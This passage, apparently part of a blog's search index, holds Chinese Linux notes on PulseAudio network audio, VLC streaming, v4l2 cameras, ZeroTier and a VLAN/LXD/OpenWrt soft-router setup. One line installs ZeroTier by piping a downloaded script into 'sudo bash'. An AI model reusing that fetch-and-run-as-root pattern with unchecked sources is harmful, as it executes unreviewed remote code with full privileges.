\u5ef6\u8fdf\u633a\u4f4e\u7684</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#tunnel\u6a21\u5f0f","title":"tunnel\u6a21\u5f0f","text":"<p>\u901a\u8fc7tunnel\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u65b0\u7684sink\uff0c\u5c06\u6240\u6709\u97f3\u9891\u901a\u8fc7\u7f51\u7edc\u53d1\u9001\u5230\u53e6\u4e00\u4e2aserver\u4e0a\uff08source\u4e5f\u4e00\u6837\uff09\u3002\u597d\u5904\u662f\u53ef\u4ee5\u65e0\u7f1d\u5207\u6362\u4f7f\u7528\u672c\u5730\u8fd8\u662f\u8fdc\u7a0b\u8bbe\u5907\u3002</p> <p>Modules \u2013 PulseAudio (www.freedesktop.org)</p> <p>\u5047\u8bbeA\uff0cB\u4e24\u4e2a\u673a\u5668\uff0cA\u6709\u9ea6\u514b\u98ce\uff0cB\u6709\u626c\u58f0\u5668\u3002\u53ef\u4ee5\u901a\u8fc7\u4ee5\u4e0b\u914d\u7f6e\uff0c\u8ba9A\u83b7\u5f97B\u7684\u626c\u58f0\u5668\uff0cB\u83b7\u5f97A\u7684\u9ea6\u514b\u98ce\u3002 <pre><code># A\nload-module module-native-protocol-tcp auth-anonymous=1\nload-module module-tunnel-sink server=192.168.36.215\n\n# B\nload-module module-native-protocol-tcp auth-anonymous=1\nload-module module-tunnel-source server=192.168.36.230\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#rtp","title":"RTP","text":"<p>RTP is the\u00a0Realtime Transfer Protocol. It is a well-known protocol for transferring audio and video data over IP. Two related protocols are SDP and SAP. SDP is the\u00a0Session Description Protocol\u00a0and can be used to describe RTP sessions. SAP is the\u00a0Session Announcement Protocol\u00a0and can be used to announce RTP sessions that are described with SDP. (Modern SIP based VoIP phones use RTP/SDP for their sessions, too) All three protocols are defined in IETF RFCs (RFC3550, RFC3551, RFC2327, RFC2327). They can be used in both multicast and unicast fashions. PulseAudio exclusively uses multicast RTP/SDP/SAP containing audio data.</p> <ul> <li>\u53ef\u4ee5\u7528\u4e8e1\u5bf9\u591a\uff0c\u591a\u5bf9\u591a\u7b49\u573a\u666f\u3002</li> <li> <p>RTP\u57fa\u4e8eIP\u5c42\u7684\u534f\u8bae\u5ef6\u8fdf\u53ef\u80fd\u66f4\u4f4e\uff1f</p> </li> <li> <p>pulseaudio\u76ee\u524d\u53ea\u652f\u6301LAN\u5185\u3002\u6ca1\u6cd5\u5728\u8de8LAN\u7684\u4e24\u53f0\u8bbe\u5907\u4e2d\u5b9e\u73b0\u3002</p> <p>The current implementation is designed to be used exclusively in local area networks, though Internet use is theoretically supported. Only uncompressed audio is supported, hence you won't be able to transmit more than a few streams at the same time over a standard LAN.</p> </li> </ul>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#rygel","title":"Rygel","text":"<p>Your best bet is probably to setup a proper media server (like Rygel, which works well with Pulseaudio) to transcode the raw audio to something like MP3 and stream that instead.</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5176\u5b83module","title":"\u5176\u5b83module","text":"<p>module-simple-protocol-tcp</p> <p>An implementation of a simple protocol which allows playback by using simple tools like netcat. Just connect to the listening socket of this module and write the audio data to it, or read it from it for playback, resp. recording.</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#vlc\u8fdb\u884chttp\u4e32\u6d41","title":"vlc\u8fdb\u884chttp\u4e32\u6d41","text":"<ul> <li>\u4f18\u70b9\uff1a\u5ba2\u6237\u7aef\u4e0d\u7528\u5b89\u88c5\u8f6f\u4ef6\uff0c\u53ea\u9700\u8981\u6253\u5f00\u6d4f\u89c8\u5668</li> <li>\u7f3a\u70b9\uff1a\u5ef6\u8fdf\u67093-4s\uff0c\u4e0d\u9002\u7528\u4e8e\u64ad\u653e\u89c6\u9891\u573a\u666f</li> </ul> <p>\u5173\u952e\u70b9\uff1asource\u4e2d\u9ed8\u8ba4\u6709\u4e00\u4e2amonitor\u7684\u6e90\uff0c\u8be5\u6e90\u5c31\u53ef\u4ee5\u83b7\u5f97\u8f93\u51fa\u5230\u626c\u58f0\u5668\u7684\u58f0\u97f3</p> <p><pre><code>cvlc -vvv pulse://XXXX --sout '#transcode{acodec=mp3,ab=128,channels=2}:standard{access=http,dst=0.0.0.0:8888/pc.mp3}'\n</code></pre> \u8bbe\u5907\u4e0a</p> <pre><code>http://your.local.ip.address:8888/pc.mp3\n</code></pre>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5404\u79cd\u4e32\u6d41","title":"\u5404\u79cd\u4e32\u6d41","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#windows-to-linux","title":"windows to linux","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#linux-to-anything","title":"linux to anything","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u89c6\u9891","title":"\u89c6\u9891","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#v4l2","title":"v4l2","text":"<p>\u5217\u51fa\u6240\u6709\u8bbe\u5907 <pre><code>root@tianyi \u279c  ~ v4l2-ctl --list-devices\nUSB2 Video: USB2 Video (usb-0000:00:14.0-4):\n        /dev/video2\n        /dev/video3\n        /dev/media1\n\nEasyCamera: EasyCamera (usb-0000:00:14.0-5):\n        /dev/video0\n        /dev/video1\n        /dev/media0\n</code></pre></p> <p>\u7b14\u8bb0\u672c\u81ea\u5e26\u6444\u50cf\u5934 <pre><code>root@tianyi \u279c  ~ v4l2-ctl -d /dev/video0 --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : EasyCamera: EasyCamera\n        Bus info         : usb-0000:00:14.0-5\n        Driver version   : 6.2.16\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\n\nPriority: 2\nVideo input : 0 (Input 1: ok)\nFormat Video Capture:\n        Width/Height      : 640/480\n        Pixel Format      : 'YUYV' (YUYV 4:2:2)\n        Field             : None\n        Bytes per Line    : 1280\n        Size Image        : 614400\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Limited Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 640, Height 480\n        Default     : Left 0, Top 0, Width 640, Height 480\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 640, Height 480, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 640, Height 480, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 30.000 (30/1)\n        Read buffers     : 0\n</code></pre></p> <p>\u91c7\u96c6\u5361 <pre><code>root@tianyi \u279c  ~ v4l2-ctl -d /dev/video2 --all\nDriver Info:\n        Driver name      : uvcvideo\n        Card type        : USB2 Video: USB2 Video\n        Bus info         : usb-0000:00:14.0-4\n        Driver version   : 6.2.16\n        Capabilities     : 0x84a00001\n                Video Capture\n                Metadata Capture\n                Streaming\n                Extended Pix Format\n                Device Capabilities\n        Device Caps      : 0x04200001\n                Video Capture\n                Streaming\n                Extended Pix Format\nPriority: 2\nVideo input : 0 (Input 1: ok)\nFormat Video Capture:\n        Width/Height      : 2560/1600\n        Pixel Format      : 'MJPG' (Motion-JPEG)\n        Field             : None\n        Bytes per Line    : 0\n        Size Image        : 8192000\n        Colorspace        : sRGB\n        Transfer Function : Rec. 709\n        YCbCr/HSV Encoding: ITU-R 601\n        Quantization      : Default (maps to Full Range)\n        Flags             :\nCrop Capability Video Capture:\n        Bounds      : Left 0, Top 0, Width 2560, Height 1600\n        Default     : Left 0, Top 0, Width 2560, Height 1600\n        Pixel Aspect: 1/1\nSelection Video Capture: crop_default, Left 0, Top 0, Width 2560, Height 1600, Flags:\nSelection Video Capture: crop_bounds, Left 0, Top 0, Width 2560, Height 1600, Flags:\nStreaming Parameters Video Capture:\n        Capabilities     : timeperframe\n        Frames per second: 30.000 (30/1)\n        Read buffers     : 0\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u5176\u5b83\u8f6f\u4ef6","title":"\u5176\u5b83\u8f6f\u4ef6","text":"","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#zerotier","title":"zerotier","text":"<pre><code>curl -s https://install.zerotier.com | sudo bash\n</code></pre> <p>join network <pre><code>% zerotier-cli info\n200 info 8af72edda7 1.10.2 ONLINE\n\n% zerotier-cli join d5e04297a16fa690\n200 join OK\n</code></pre></p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E5%AD%A6%E4%B9%A0/2022/11/06/2022-11-06-linux%E7%9B%B8%E5%85%B3/#\u975esnap\u5b89\u88c5chromium","title":"\u975esnap\u5b89\u88c5chromium","text":"<p>Chromium - web browser (Xenial &amp; newer) : Rob Savoury (launchpad.net)</p>","tags":["tty","sed","awk","wifi","fdisk","parted","virtualbox","mount"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/","title":"VLAN\u5b9e\u73b0\u5355\u7f51\u53e3\u8f6f\u8def\u7531","text":"<p>\u8d77\u56e0\u662f\u53d1\u73b0\u5728\u539f\u672c\u7684\u4e24\u4e2a\u8def\u7531\u5668\u95f4\u67b6\u8bbewireguard\u96a7\u9053\uff0c\u5176\u4e2d\u4e00\u4e2a\u8def\u7531\u5668(\u5c0f\u7c734A\u5343\u5146\u7248)\u9047\u5230\u4e86CPU\u74f6\u9888\uff0c\u5bfc\u81f4\u5e26\u5bbd\u53ea\u80fd\u8fbe\u5230100-200\u5de6\u53f3\u3002\u540e\u9762\u7814\u7a76\u4e86\u5e02\u9762\u4e0a\u7684\u5404\u79cd\u8def\u7531\u5668\u7684CPU\u578b\u53f7\uff0c\u5305\u62ec\u77ff\u6e23\u8def\u7531\u5668\u3002\u8d2d\u4e70\u4e86\u4e00\u4e2a100\u5143\u7684\u53ef\u4ee5\u5237openwrt\u7684\u7ade\u6597\u4e912.0\uff0c\u5e26\u5bbd\u53ef\u4ee5\u8fbe\u5230200-300M\uff0c\u4f46\u4ecd\u8fdc\u4f4e\u4e8e\u7406\u60f3\u7684\u5343\u5146\u3002\u76ee\u524d\u5373\u4fbf\u662f500\u5143\u4ee5\u4e0a\u7684\u9ad8\u7aef\u8def\u7531\u5668\uff0c\u5176\u914d\u7f6e\u4ecd\u7136\u53ea\u67094\u6838Cortex A53@2.0GHz\u7684\u6c34\u5e73\u3002</p> <p>\u5076\u7136\u770b\u5230\u7528\u65e7\u7b14\u8bb0\u672c\u505a\u8f6f\u8def\u7531\u7684\u89c6\u9891\uff0c\u9042\u840c\u751f\u4e86\u6298\u817e\u8f6f\u8def\u7531\u7684\u60f3\u6cd5\u3002\u4ed4\u7ec6\u7814\u7a76\u5176\u65b9\u6848\u540e\u53d1\u73b0\u4e3apppoe\u62e8\u53f7\u4e0a\u7f51\u7684\u65b9\u5f0f\uff0c\u4e0d\u9002\u7528\u4e8edhcp\u4e0a\u7f51\u7684\u60c5\u51b5\u3002\u540e\u5076\u7136\u53d1\u73b0\u6240\u8d2d\u4e70\u8def\u7531\u5668\u652f\u6301vlan\u529f\u80fd\uff08\u5176\u5b9e\u540e\u9762\u53d1\u73b0\u6240\u6709openwrt\u8def\u7531\u5668\u90fd\u652f\u6301\uff09\uff0c\u4e8e\u662f\u81ea\u5df1\u72ec\u7acb\u6784\u601d\u4e86\u540e\u9762\u7684\u67b6\u6784\u56fe\u3002\u5e76\u5c1d\u8bd5\u6210\u529f(11/5)\uff0c\u6700\u7ec8\u5728\u7ea2\u7c73AX6S+\u8f6f\u8def\u7531\u7684\u60c5\u51b5\u4e0b\uff0c\u8fbe\u5230\u4e86500M\u7684\u5e26\u5bbd\uff0c\u6b64\u65f6AX6S\u7684\u53cc\u6838Cortex A53@1.2GHz CPU\u5360\u7528\u7387\u4e5f\u8fbe\u5230\u4e86100%\u3002</p> <p>\u4e4b\u540e\u518d\u63a5\u518d\u52b1\uff0c\u5c06AX6S\u4e5f\u914d\u7f6e\u4e86vlan\uff0c\u5e76\u5728\u65e7\u7b14\u8bb0\u672c\u5b9e\u73b0\u8f6f\u8def\u7531\u3002\u6700\u7ec8\u5e26\u5bbd\u8fbe\u5230\u4e86880Mbps\uff0cscp\u6587\u4ef6\u8fbe\u523098MB/s\u7684\u901f\u7387\u3002\u5e76\u4e14\u4e4b\u540e\u8fd8\u6210\u529f\u914d\u7f6e\u4e86Guest WIFI\uff0c\u5c06\u5176\u548c\u4e3b\u7f51\u7edc\u9694\u79bb\u5f00\u6765\uff0c\u66f4\u52a0\u4fdd\u8bc1\u4e86\u5b89\u5168\u6027\u3002</p> <p>\u901a\u8fc7\u672c\u6b21\u9879\u76ee\uff0c\u5b66\u4f1a\u4e86\uff1a - linux\u4e0b\uff0cip, netplan\u521b\u5efabridge\u548cvlan - lxc\u5bb9\u5668\u7684\u4f7f\u7528 - openwrt DSA\u67b6\u6784\u914d\u7f6evlan</p> <p>\u5f04\u5b8c\u540e\uff0c\u5728\u7f51\u4e0a\u641c\u7d22\u4e86\u4e00\u4e0b\u76f8\u5173\u5b9e\u73b0\uff0c\u53d1\u73b0\u63d0\u5230\u5355\u7f51\u53e3\u8f6f\u8def\u7531\uff0c\u6709\u51e0\u79cd\u60c5\u51b5\uff1a - \u9ed8\u8ba4\u662fpppoe\u4e0a\u7f51\u65b9\u5f0f\uff0c\u8be5\u65b9\u5f0f\u6bd4\u8f83\u7b80\u5355\uff0c\u4e0d\u6d89\u53cavlan\u7684\u8bbe\u7f6e\uff0c\u4f46\u662f\u4e0d\u9002\u7528\u4e8edhcp\u4e0a\u7f51\u7684\u60c5\u51b5\u3002 - \u65c1\u8def\u7531\uff0c\u4e4b\u524d\u6211\u4e5f\u5199\u8fc7\u4f7f\u7528\u6811\u8393\u6d3e\u5b9e\u73b0\u900f\u660e\u4ee3\u7406\u3002\u8be5\u65b9\u5f0f\u9700\u8981\u4fee\u6539\u4e0a\u7f51\u8bbe\u5907\u7684\u7f51\u5173\u4e3a\u65c1\u8def\u8bbe\u5907\u3002   - \u7f51\u4e0a\u4e89\u8bba\u6bd4\u8f83\u591a\u7684\u662f\u662f\u5426\u4f1a\u6709\u4e24\u6b21NAT\uff0c\u5176\u5b9e\u4e0d\u8bba\u600e\u6837\uff0c\u4e3b\u8def\u7531\u5fc5\u7136\u8981\u8d77\u5230\u4e00\u6b21NAT\u3002\u8fd9\u6837\u7684\u8bdd\uff0c\u4e3b\u8def\u7531\u7684\u6027\u80fd\u81f3\u5c11\u4e0d\u80fd\u592a\u5f31\u3002\u5f53\u7136\u5982\u679c\u5bb6\u91cc\u53ea\u6709100M\u7684\u5bbd\u5e26\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e5f\u8bb8\u8db3\u591f\u3002\u4f46\u662f\u5982\u679c\u65c1\u8def\u8bbe\u5907\u7684\u6027\u80fd\u5f88\u5f3a\u7684\u8bdd\uff0c\u6027\u80fd\u8fd8\u662f\u767d\u767d\u6d6a\u8d39\u4e86\u3002\u4e0d\u5982\u8fd9\u91cc\u4ecb\u7ecd\u7684vlan\u65b9\u5f0f\u3002 - \u4e5f\u770b\u5230\u4e86\u4f7f\u7528vlan\u5b9e\u73b0\u6211\u8fd9\u79cd\u8f6f\u8def\u7531\u7684\u73a9\u6cd5\uff0c\u4f46\u662f\u9700\u8981\u4e00\u4e2a\u786c\u4ef6\u4ea4\u6362\u673a\u3002\u77e5\u9053\u4f7f\u7528\u666e\u901aopenwrt\u8bbe\u5907\u5c31\u53ef\u4ee5\u5b9e\u73b0vlan\u7684\u8fd8\u662f\u4e0d\u591a\u3002</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u53c2\u8003","title":"\u53c2\u8003","text":"<ul> <li>\u53f8\u6ce2\u56fe\uff1a\u4f7f\u7528\u7b14\u8bb0\u672c + PVE\uff0c\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531\uff1a\u4e00\u4e2a\u7f51\u53e3\u4e5f\u80fd\u505a\u8f6f\u8def\u7531\uff1f\u95f2\u7f6e\u7535\u8111\u518d\u5229\u7528\uff01 - YouTube</li> <li>\u4e0d\u8fc7\u8fd9\u91cc\u7684\u7ed3\u6784\u53ea\u9002\u7528\u4e8epppoe\u4e0a\u7f51\u65b9\u5f0f\uff0c\u5bf9\u4e8edhcp\u4e0a\u7f51\u65b9\u5f0f\u5219\u4e0d\u9002\u7528\uff08\u6b64\u7ed3\u6784\u4e2d\u53ea\u6709\u8f6f\u8def\u7531\u4e00\u4e2adhcp\u670d\u52a1\u5668\uff0c\u4e0d\u7528\u8003\u8651dhcp\u51b2\u7a81\u3002\u5bf9\u4e8edhcp\u4e0a\u7f51\u65b9\u5f0f\u5219\u9700\u8981\u4f7f\u7528vlan\u9694\u79bbISP\u7684dhcp\u548c\u8f6f\u8def\u7531\u7684dhcp\u670d\u52a1\uff09</li> <li> <p>\u7ed3\u6784\uff1a</p> </li> <li> <p>\u5229\u7528\u6811\u8393\u6d3e + LXC\u8fd0\u884c\u591a\u4e2a\u670d\u52a1\uff0c\u5e76\u4f7f\u7528Openwrt\u4f5c\u4e3a\u9632\u706b\u5899\u7ba1\u7406\uff1awww.makikiweb.com/Pi/lxc_openwrt.html</p> </li> <li>\u65b0\u7248\u6559\u7a0b\uff1awww.makikiweb.com/Pi/virtual_openwrt_on_lxd.html</li> </ul>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531","title":"\u5355\u7f51\u53e3\u5b9e\u73b0\u8f6f\u8def\u7531","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u67b6\u6784\u56fe","title":"\u67b6\u6784\u56fe","text":"<p>switch: - \u7eff\uff1a\u7aef\u53e3 - \u6a59\uff1a\u8bbe\u5907 - \u865a\u7ebf\uff1a\u865a\u62df\u8bbe\u5907 - \u84dd\uff1a\u7f51\u6865 - \u7070\uff1a\u7f51\u7edc\u63a5\u53e3 </p> <p>DSA - \u6a59\uff1a\u8bbe\u5907 - \u865a\u7ebf\uff1a\u865a\u62df\u8bbe\u5907 - \u84dd\uff1a\u7f51\u6865 - \u7eff\uff1a\u7f51\u7edc\u63a5\u53e3 </p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#1-\u8bbe\u7f6ehost","title":"1. \u8bbe\u7f6ehost","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#lxc","title":"lxc","text":"<p>\u5b89\u88c5lxd <pre><code>sudo apt install lxd   # \u5b89\u88c5lxd\nlxd init  # \u4f1a\u8bbe\u7f6e\u5b58\u50a8\u6c60\uff0c\u7f51\u7edcbridge\uff0c\u5168\u90e8\u9ed8\u8ba4\u5373\u53ef\n</code></pre></p> <p>\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4e24\u4e2a\u7f51\u7edc\u63a5\u53e3\u7684profile\uff0c\u7528\u4e8eopenwrt\u3002\uff08\u8fd8\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u53ea\u5305\u542bbr1\u7684profile\uff0c\u7528\u4e8e\u5176\u4f59lxc\u5bb9\u5668\uff09 <pre><code>lxc profile create twointf\nlxc profile edit twointf\n</code></pre> \u5185\u5bb9 <pre><code>config: {}\ndescription: 2 interfaces\ndevices:\n  eth0:\n    name: eth0\n    nictype: bridged\n    parent: br1\n    type: nic\n  eth1:\n    name: eth1\n    nictype: bridged\n    parent: br0\n    type: nic\n  root:\n    path: /\n    pool: default\n    type: disk\nname: twointf\n</code></pre></p> <p>\u62c9\u53d6openwrt\u955c\u50cf <pre><code>lxc image copy images:openwrt/22.03 local: --copy-aliases --auto-update\n</code></pre></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#bridge-vlan","title":"bridge, vlan","text":"<p>\u8bbe\u7f6enetplan\uff0c\u6309\u7167bridge, vlan\u8282\uff0c\u521b\u5efa\u4e24\u4e2avlan\u548cbr0, br1\u3002</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#2-\u8def\u7531\u5668vlan\u8bbe\u7f6e","title":"2. \u8def\u7531\u5668vlan\u8bbe\u7f6e","text":"<p>\u89c1\u540e\u9762DSA\u8bbe\u7f6e\u8282</p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u6027\u80fd\u6d4b\u8bd5","title":"\u6027\u80fd\u6d4b\u8bd5","text":"<p>\u4ece\u5b9e\u9a8c\u5ba4\u5230\u5bdd\u5ba4\u7684wireguard\u96a7\u9053\u53ef\u4ee5\u8fbe\u5230500Mbs\u7684\u901f\u7387\uff0c\u5c06\u4e24\u6838Cortex A53@1.2GHz\u51e0\u4e4e\u8dd1\u6ee1\u3002\u800c\u539f\u672c\u901a\u8fc7\u8def\u7531\u5668(4\u6838MIPS 1004kc@880MHz)\u5219\u4ec5\u80fd\u8dd1\u5230200Mbs\u3002 </p> <p>\u4e24\u8fb9\u5747\u4f7f\u7528\u8f6f\u8def\u7531\u540e\u8fbe\u5230\u5343\u5146\u6c34\u5e73, scp\u53ef\u4ee5\u8fbe\u523098MB/s\u7684\u901f\u7387\u3002</p> <p></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u521b\u5efabridge-vlan","title":"\u521b\u5efabridge, vlan","text":"","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#iproute2\u4e34\u65f6\u8bbe\u7f6e","title":"iproute2(\u4e34\u65f6\u8bbe\u7f6e)","text":"<ul> <li>bridge\uff1aNetwork bridge - ArchWiki (archlinux.org)</li> <li>vlan: VLAN - ArchWiki (archlinux.org)</li> </ul> <pre><code>lsmod |grep 802\n\n#\u6dfb\u52a0vlan\u548cbridge\nsudo ip link add link enp7s0 eth0.1 type vlan id 1\nsudo ip link add link enp7s0 eth0.2 type vlan id 2\nsudo ip link add name br0 type bridge\nsudo ip link add name br1 type bridge\n\n#set up\nsudo ip link set dev br0 up\nsudo ip link set dev br1 up\nsudo ip link set dev eth0.1 up\nsudo ip link set dev eth0.2 up\n\n#\u8bbe\u7f6ebridge master\nsudo ip link set eth0.2 master br1 \nsudo ip link set eth0.1 master br0\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#netplannetworkmanager","title":"netplan/networkmanager","text":"<p>nmcli\u547d\u4ee4\u8fd8\u884c\uff0c\u4e0d\u8fc7\u914d\u7f6e\u590d\u6742\u7f51\u7edc\u65f6\u8fd8\u662f\u4f7f\u7528netplan\u914d\u7f6e\u6587\u4ef6\u7684\u65b9\u5f0f\u66f4\u52a0\u9002\u5408</p> <pre><code>nmcli con add ifname br0 type bridge con-name br0\nnmcli con add type bridge-slave ifname enp7s0 master br0\nnmcli con up br0\n\nnmcli con add type vlan con-name vlan1 dev enp7s0 id 1\n</code></pre>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#netplannetworkd\u63a8\u8350","title":"netplan/networkd(\u63a8\u8350)","text":"<p>ubuntu\u684c\u9762\u7248\uff0cnetplan\u5e95\u5c42\u4f7f\u7528\u7684\u9ed8\u8ba4\u65f6NetworkManger\u3002\u670d\u52a1\u5668\u7248\u5219\u662fnetworkd\uff0cnetworkd\u7684\u914d\u7f6e\u6587\u4ef6\u4f7f\u7528\u8d77\u6765\u66f4\u7b80\u5355\u4e9b\u3002</p> <p>\u914d\u7f6e\u6587\u6863\uff1aCanonical Netplan</p> <p>\u914d\u7f6e\uff1a <pre><code>network:\n  version: 2\n  renderer: networkd\n  ethernets:\n    eth0:\n      dhcp4: false\n      dhcp6: false\n  vlans:\n    eth0.1:\n      link: eth0\n      id: 1\n    eth0.2:\n      link: eth0\n      id: 2\n  bridges:\n    br0:\n      interfaces:\n        - eth0.1\n    br1:\n      dhcp4: true\n      interfaces:\n        - eth0.2\n</code></pre> \u914d\u7f6e\u5b8c\u6210\u540e\uff0c\u9700\u8981\u5e94\u7528\u4fee\u6539 <pre><code>netplan apply\n</code></pre></p>","tags":["openwrt","vlan","\u8f6f\u8def\u7531","bridge"]},{"location":"%E6%8A%98%E8%85%BE/2022/11/08/2022-11-08-VLAN%E5%AE%9E%E7%8E%B0%E5%8D%95%E7%BD%91%E5%8F%A3%E8%BD%AF%E8%B7%AF%E7%94%B1/#\u8bbe\u7f6e\u7f51\u5361\u56fa\u5b9a\u540d\u79f0","title":"\u8bbe\u7f6e\u7f51\u5361\u56fa\u5b9a\u540d\u79f0","text":"<p>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0c\u5f53\u673a\u5668PCIE\u8bbe\u5907\u53d8\u5316\u65f6\uff0c\u7f51\u7edc\u63a5\u53e3\u540d\u5b57\u53ef\u80fd\u4f1a\u53d1\u751f\u53d8\u5316\uff08\u6bd4\u5982\u62d4\u63d2\u663e\u5361\uff09\u3002\u89e3\u51b3\u529e\u6cd5</p> <pre><code>vim /etc/udev/rules.d/80-net.rules\n\n# 80-net.rules\nSUBSYSTEM==\"net\", ACTION==\"add\", DRIVERS==\"?*\", ATTR{address}==\"7c:10:c9:a2:53:d8\", 